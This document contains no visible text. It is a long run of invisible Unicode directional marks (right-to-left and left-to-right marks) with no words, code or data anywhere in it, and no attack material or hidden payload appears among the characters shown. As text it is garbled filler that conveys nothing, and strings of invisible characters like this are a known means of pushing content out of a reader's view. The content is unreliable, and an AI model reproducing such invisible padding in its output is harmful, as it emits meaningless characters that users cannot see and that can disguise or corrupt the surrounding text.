‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏